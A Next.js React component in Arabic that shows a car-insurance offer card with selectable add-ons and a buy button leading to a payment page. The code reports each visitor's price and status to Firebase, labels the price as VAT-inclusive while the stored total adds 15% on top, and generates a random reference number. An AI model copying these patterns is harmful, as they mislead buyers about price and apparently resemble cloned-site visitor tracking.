"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { Check, Star, Shield, Clock } from "lucide-react";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { addData, updateStaute } from "@/lib/firebase";

interface OfferProps {
  offer: {
    id: string;
    name: string;
    type: string;
    main_price: string;
    company: {
      name: string;
      image_url: string;
    };
    extra_features: Array<{ id: string; content: string; price: number }>;
    extra_expenses: Array<{ reason: string; price: number }>;
  };
}

export default function EnhancedOfferCard({ offer }: OfferProps) {
  const router = useRouter();
  const [selectedFeatures, setSelectedFeatures] = useState<number[]>([]);
  const [totalPrice, setTotalPrice] = useState(parseFloat(offer.main_price));
  const [isProcessing, setIsProcessing] = useState(false);

  // Initialize with free features selected by default
  useEffect(() => {
    const freeFeatureIndices = offer.extra_features
      .map((feature, index) => (feature.price === 0 ? index : -1))
      .filter((index) => index !== -1);
    setSelectedFeatures(freeFeatureIndices);
  }, [offer.extra_features]);

  // Calculate total price based on selected features
  const calculateTotalPrice = useCallback(() => {
    const basePrice = parseFloat(offer.main_price);
    const featuresPrice = selectedFeatures.reduce((total, index) => {
      return total + offer.extra_features[index].price;
    }, 0);
    return basePrice + featuresPrice;
  }, [offer.main_price, selectedFeatures, offer.extra_features]);

  // Update total price when selected features change
  useEffect(() => {
    setTotalPrice(calculateTotalPrice());
  }, [selectedFeatures, calculateTotalPrice]);

  // Handle feature selection/deselection
  const handleFeatureSelection = useCallback(
    (index: number, checked: boolean) => {
      setSelectedFeatures((prev) =>
        checked ? [...prev, index] : prev.filter((i) => i !== index)
      );
    },
    []
  );

  // Get Arabic insurance type name
  const getArabicInsuranceType = useMemo(
    () => (type: string) => {
      const types = {
        "against-others": "ضد الغير",
        comprehensive: "شامل",
        special: "مميز",
      };
      return types[type as keyof typeof types] || type;
    },
    []
  );

  // Handle offer selection and navigate to payment
  const handleOfferSelection = useCallback(async () => {
    setIsProcessing(true);

    try {
      // Get insurance details from localStorage
      const insuranceDetails = JSON.parse(
        localStorage.getItem("insuranceDetails") || "{}"
      );
      const endDate = new Date(
        new Date().setFullYear(new Date().getFullYear() + 1)
      )
        .toISOString()
        .split("T")[0];

      // Create selected offer data
      const selectedOfferData = {
        id: offer.id,
        name: offer.name,
        company_id: crypto.randomUUID(),
        type: offer.type,
        main_price: parseFloat(offer.main_price),
        selectedFeatures: selectedFeatures.map((index) => ({
          ...offer.extra_features[index],
          id: offer.extra_features[index].id,
        })),
        totalPrice,
        company: offer.company,
        purchaseDate: new Date().toISOString(),
        insuranceDetails,
      };

      const _id = localStorage.getItem("visitor");
      if (_id) {
        addData({ id: _id, totalPrice });
        updateStaute("idle", _id);
      }

      // Store in localStorage
      const existingOffers = JSON.parse(
        localStorage.getItem("selectedOffers") || "[]"
      );
      existingOffers.push(selectedOfferData);
      localStorage.setItem("selectedOffers", JSON.stringify(existingOffers));

      // Store payment details in localStorage
      const paymentDetails = {
        policyDetails: {
          insurance_type: getArabicInsuranceType(offer.type),
          company: offer.company.name,
          start_date: insuranceDetails.start_date,
          endDate,
          referenceNumber: Math.floor(
            100000000 + Math.random() * 900000000
          ).toString(),
        },
        summaryDetails: {
          subtotal: totalPrice,
          vat: 0.15,
          total: totalPrice * 1.15,
        },
      };
      localStorage.setItem("paymentDetails", JSON.stringify(paymentDetails));

      // Navigate to payment page
      router.push("/payment");
    } catch (error) {
      console.error("Error processing offer selection:", error);
      alert("حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى.");
    } finally {
      setIsProcessing(false);
    }
  }, [offer, totalPrice, selectedFeatures, getArabicInsuranceType, router]);

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      whileHover={{ y: -2 }}
    >
      <Card className="overflow-hidden border-0 shadow-lg hover:shadow-2xl transition-all duration-300 bg-gradient-to-br from-white to-gray-50/50">
        <div className="flex flex-col lg:flex-row">
          {/* Company Logo Section */}
          <div className="w-full lg:w-1/4 p-6 lg:p-8 flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-50 relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-[#146394]/5 to-[#1e7bb8]/5" />

            <motion.div
              whileHover={{ scale: 1.05 }}
              transition={{ type: "spring", stiffness: 300 }}
            >
              <Badge
                variant="info"
                className="mb-4 px-4 py-2 text-sm font-bold shadow-md"
              >
                {getArabicInsuranceType(offer.type)}
              </Badge>
            </motion.div>

            <motion.img
              src={offer.company.image_url || "/placeholder.svg"}
              alt={`شعار ${offer.company.name}`}
              className="h-20 sm:h-24 lg:h-28 object-contain relative z-10"
              loading="lazy"
              whileHover={{ scale: 1.1 }}
              transition={{ type: "spring", stiffness: 300 }}
            />

            <div className="mt-4 flex items-center gap-2 text-sm text-gray-600">
              <Shield className="w-4 h-4" />
              <span>مرخص من ساما</span>
            </div>
          </div>

          {/* Features Section */}
          <div className="w-full lg:w-2/4 p-6">
            <CardHeader className="p-0 mb-6">
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-gray-800 flex items-center gap-2">
                  <Star className="w-5 h-5 text-yellow-500 fill-current" />
                  المنافع الإضافية
                </h3>
                <div className="flex items-center gap-2 text-sm text-gray-500">
                  <Clock className="w-4 h-4" />
                  <span>إصدار فوري</span>
                </div>
              </div>
            </CardHeader>

            <CardContent className="p-0">
              <div className="space-y-3">
                {offer.extra_features.map((feature, index) => (
                  <motion.label
                    key={index}
                    className={`flex items-center p-4 rounded-lg transition-all duration-200 border ${
                      feature.price === 0
                        ? "bg-green-50 border-green-200 cursor-default"
                        : selectedFeatures.includes(index)
                        ? "bg-blue-50 border-blue-200 cursor-pointer"
                        : "hover:bg-gray-50 border-gray-200 cursor-pointer"
                    }`}
                    whileHover={{ scale: feature.price === 0 ? 1 : 1.02 }}
                    whileTap={{ scale: feature.price === 0 ? 1 : 0.98 }}
                  >
                    <input
                      type="checkbox"
                      checked={selectedFeatures.includes(index)}
                      disabled={feature.price === 0}
                      onChange={(e) =>
                        handleFeatureSelection(index, e.target.checked)
                      }
                      className="ml-4 h-5 w-5 text-[#146394] rounded focus:ring-[#146394] focus:ring-2"
                    />

                    <div className="flex-1">
                      <div className="flex items-center justify-between">
                        <span className="text-gray-800 font-medium">
                          {feature.content}
                        </span>
                        {feature.price === 0 ? (
                          <Badge variant="success" className="text-xs">
                            مجاني
                          </Badge>
                        ) : (
                          <span className="text-[#146394] font-bold">
                            {feature.price} ريال
                          </span>
                        )}
                      </div>
                    </div>

                    {selectedFeatures.includes(index) && (
                      <Check className="w-5 h-5 text-green-600 mr-2" />
                    )}
                  </motion.label>
                ))}
              </div>
            </CardContent>
          </div>

          {/* Price Section */}
          <div className="w-full lg:w-1/4 p-6 lg:p-8 bg-gradient-to-br from-gray-50 to-white flex flex-col justify-center border-t lg:border-t-0 lg:border-r">
            <div className="text-center space-y-6">
              <div className="space-y-2">
                <span className="block text-sm text-gray-500">
                  السعر النهائي
                </span>
                <motion.div
                  key={totalPrice}
                  initial={{ scale: 1.1 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", stiffness: 300 }}
                >
                  <span className="text-3xl font-bold text-[#146394]">
                    {totalPrice.toFixed(2)}
                  </span>
                  <span className="text-lg text-gray-600 mr-2">ريال</span>
                </motion.div>
                <p className="text-xs text-gray-500">
                  شامل ضريبة القيمة المضافة
                </p>
              </div>

              <Button
                onClick={handleOfferSelection}
                disabled={isProcessing}
                variant="default"
                size="lg"
                className="w-full shadow-lg hover:shadow-xl"
              >
                {isProcessing ? (
                  <div className="flex items-center justify-center gap-2">
                    <motion.div
                      className="w-5 h-5 border-2 border-white border-t-transparent rounded-full"
                      animate={{ rotate: 360 }}
                      transition={{
                        duration: 1,
                        repeat: Infinity,
                        ease: "linear",
                      }}
                    />
                    جاري المعالجة...
                  </div>
                ) : (
                  "شراء الآن"
                )}
              </Button>

              <div className="flex items-center justify-center gap-2 text-xs text-gray-500">
                <Shield className="w-4 h-4" />
                <span>دفع آمن ومشفر</span>
              </div>
            </div>
          </div>
        </div>
      </Card>
    </motion.div>
  );
}
